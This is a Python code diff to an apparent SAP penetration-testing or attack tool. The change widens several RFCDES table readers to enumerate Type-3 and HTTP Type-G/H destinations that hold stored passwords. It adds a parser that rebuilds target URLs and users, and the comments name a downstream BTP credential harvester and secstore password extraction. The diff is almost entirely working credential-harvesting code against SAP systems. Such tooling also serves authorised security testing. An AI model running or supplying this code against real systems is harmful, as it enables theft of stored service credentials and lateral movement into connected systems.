@@ -1574,7 +1574,8 @@ def _parse_rsrfcchk_output(spool_lines: list, node: SAPNode) -> list:
 
 
 def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
-    """Fallback: read RFCDES table directly for Type-3 connections with stored passwords."""
+    """Fallback: read RFCDES for Type-3 / Type-G / Type-H destinations
+    with stored passwords."""
     print(f"[*] {node.sid}: Trying RFC_READ_TABLE fallback on RFCDES...")
     connections = []
 
@@ -1588,7 +1589,7 @@ def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
                 {"FIELDNAME": "RFCTYPE"},
                 {"FIELDNAME": "RFCOPTIONS"},
             ],
-            OPTIONS=[{"TEXT": "RFCTYPE = '3'"}],
+            OPTIONS=[{"TEXT": _RFCDES_TYPE_FILTER}],
             ROWCOUNT=500,
         )
 
@@ -1598,22 +1599,20 @@ def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
             parts = wa.split("|")
             if len(parts) >= 2:
                 dest_name = parts[0].strip()
+                rfctype = parts[1].strip() if len(parts) > 1 else ""
                 options = parts[2].strip() if len(parts) > 2 else ""
 
                 # Only include connections that have a stored password
                 if "%_PWD" not in options:
                     continue
 
-                conn_obj = RFCConn(
-                    source_sid=node.sid,
-                    source_host=node.hostname or node.ip,
-                    destination_name=dest_name,
-                )
-                _parse_rfcdes_options(conn_obj, options)
-                connections.append(conn_obj)
+                connections.append(_build_rfcdes_conn(
+                    node, dest_name, rfctype, options))
 
-        print(f"[+] {node.sid}: Found {len(connections)} Type-3 connections "
-              f"with stored passwords via RFCDES")
+        n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
+        nh = len(connections) - n3
+        print(f"[+] {node.sid}: Found {n3} Type-3 + {nh} Type-G/H "
+              f"connections with stored passwords via RFCDES")
 
     except Exception as e:
         logger.debug(f"RFCDES read failed: {format_rfc_exception(e)}")
@@ -1668,7 +1667,7 @@ def _try_rfcdes_raw_fallback(conn, node: SAPNode) -> list:
                 {'FIELDNAME': 'RFCTYPE'},
                 {'FIELDNAME': 'RFCOPTIONS'},
             ],
-            OPTIONS=[{'TEXT': "RFCTYPE = '3'"}],
+            OPTIONS=[{'TEXT': _RFCDES_TYPE_FILTER}],
             ROWCOUNT=500,
         )
 
@@ -1678,19 +1677,17 @@ def _try_rfcdes_raw_fallback(conn, node: SAPNode) -> list:
             parts = wa.split("|")
             if len(parts) >= 2:
                 dest_name = parts[0].strip()
+                rfctype = parts[1].strip() if len(parts) > 1 else ""
                 options = parts[2].strip() if len(parts) > 2 else ""
                 if "%_PWD" not in options:
                     continue
-                conn_obj = RFCConn(
-                    source_sid=node.sid,
-                    source_host=node.hostname or node.ip,
-                    destination_name=dest_name,
-                )
-                _parse_rfcdes_options(conn_obj, options)
-                connections.append(conn_obj)
+                connections.append(_build_rfcdes_conn(
+                    node, dest_name, rfctype, options))
 
-        print(f"[+] {node.sid}: Found {len(connections)} Type-3 connections "
-              f"with stored passwords via call_raw RFCDES")
+        n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
+        nh = len(connections) - n3
+        print(f"[+] {node.sid}: Found {n3} Type-3 + {nh} Type-G/H "
+              f"connections with stored passwords via call_raw RFCDES")
 
     except Exception as e:
         logger.debug(f"call_raw RFCDES failed: {format_rfc_exception(e)}")
@@ -1838,21 +1835,19 @@ def _try_tableblock_compressed_fallback(conn, node: SAPNode) -> list:
                                        ).rstrip('\x00').strip()
             rfcoptions = rd[66:566].decode('utf-16-le', errors='replace'
                                            ).rstrip('\x00').strip()
-            if not rfcdest or rfctype != '3':
+            if not rfcdest or rfctype not in ('3', 'G', 'H'):
                 continue
             if '%_PWD' not in rfcoptions:
                 continue
 
-            conn_obj = RFCConn(
-                source_sid=node.sid,
-                source_host=node.hostname or node.ip,
-                destination_name=rfcdest,
-            )
-            _parse_rfcdes_options(conn_obj, rfcoptions)
-            connections.append(conn_obj)
+            connections.append(_build_rfcdes_conn(
+                node, rfcdest, rfctype, rfcoptions))
 
-        print(f"[+] {node.sid}: Found {len(connections)} Type-3 connections "
-              f"with stored passwords via GET_TABLEBLOCK_COMPRESSED_RFC")
+        n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
+        nh = len(connections) - n3
+        print(f"[+] {node.sid}: Found {n3} Type-3 + {nh} Type-G/H "
+              f"connections with stored passwords via "
+              f"GET_TABLEBLOCK_COMPRESSED_RFC")
 
     except Exception as e:
         logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC failed: {format_rfc_exception(e)}")
@@ -1873,6 +1868,96 @@ def _parse_rfcdes_options(conn: RFCConn, options_str: str):
             conn.rfc_user = part[2:].strip()
         elif part.startswith("M="):
             conn.client = part[2:].strip()
+
+
+def _parse_rfcdes_http_options(conn: RFCConn, options_str: str):
+    """Parse RFCDES RFCOPTIONS for Type-G / Type-H destinations.
+
+    SM59 HTTP destinations encode their target as a comma-separated
+    keyed list inside RFCOPTIONS.  Kernel versions vary, but the
+    common keys are:
+
+      ``H=`` host
+      ``S=`` port
+      ``M=`` path (sometimes "M=" carries the full path without a
+              leading slash)
+      ``J=`` either an SSL flag (``2``, ``S``, ``Y``) OR — on newer
+              kernels — the full target URL ``J=https://host/...``
+      ``Q=`` ``Y`` ⇒ TLS, ``N`` ⇒ plain HTTP
+      ``U=`` HTTP basic-auth user (only when stored creds, gated
+              by the ``%_PWD`` marker the readers already check for)
+      ``Y=`` logon language (ignored for our purposes)
+      ``L=`` accept-language (ignored)
+      ``T=`` SecStore-managed password marker (``%_PWD``)
+
+    Sets ``conn.conn_type='http'`` and synthesises ``http_url``.
+    The downstream BTP-credential harvester filters on host suffix
+    so a best-effort URL is good enough; the secstore extraction
+    fills in the password later when it matches the destination
+    name.
+    """
+    conn.conn_type = "http"
+    host = path = scheme_or_url = ""
+    port = ""
+    use_https = False
+    for part in options_str.split(","):
+        part = part.strip()
+        if part.startswith("H="):
+            host = part[2:].strip()
+        elif part.startswith("S="):
+            port = part[2:].strip()
+        elif part.startswith("M="):
+            path = part[2:].strip()
+        elif part.startswith("J="):
+            scheme_or_url = part[2:].strip()
+        elif part.startswith("Q="):
+            if part[2:].strip().upper() == "Y":
+                use_https = True
+        elif part.startswith("U="):
+            conn.rfc_user = part[2:].strip()
+    # Some kernels stash the full URL in J= directly — honour that and
+    # skip the host/port reassembly.
+    if scheme_or_url.lower().startswith(("http://", "https://")):
+        conn.http_url = scheme_or_url.rstrip("/") + (
+            path if (path and path.startswith("/")) else
+            ("/" + path if path else ""))
+    else:
+        if scheme_or_url.upper() in ("2", "S", "Y") or use_https:
+            use_https = True
+        proto = "https" if use_https else "http"
+        norm_path = path if not path or path.startswith("/") else "/" + path
+        if port and port not in ("80", "443"):
+            conn.http_url = f"{proto}://{host}:{port}{norm_path}"
+        else:
+            conn.http_url = f"{proto}://{host}{norm_path}"
+    # Auth type is best-effort; secstore-recovered passwords land in
+    # conn.secstore_password regardless.  When the password marker is
+    # absent the field stays "" and the harvester skips the row.
+    if not conn.http_auth_type:
+        conn.http_auth_type = "BASICAUTHENTICATION"
+
+
+# RFCDES filter shared by every reader path.  '3' = Type-3 RFC,
+# 'G' = HTTP-to-external, 'H' = HTTP-to-ABAP.  Avoids the IN-clause
+# OpenSQL syntax mismatch on older kernels by OR-chaining instead.
+_RFCDES_TYPE_FILTER = ("RFCTYPE = '3' OR RFCTYPE = 'G' OR "
+                        "RFCTYPE = 'H'")
+
+
+def _build_rfcdes_conn(node: SAPNode, dest_name: str,
+                        rfctype: str, options: str) -> RFCConn:
+    """Build an RFCConn from one RFCDES row, dispatching to the
+    Type-3 or HTTP options parser based on ``rfctype``."""
+    conn_obj = RFCConn(
+        source_sid=node.sid,
+        source_host=node.hostname or node.ip,
+        destination_name=dest_name,
+    )
+    if rfctype in ("G", "H"):
+        _parse_rfcdes_http_options(conn_obj, options)
+    else:
+        _parse_rfcdes_options(conn_obj, options)
+    return conn_obj
 
 
 # ---------------------------------------------------------------------------
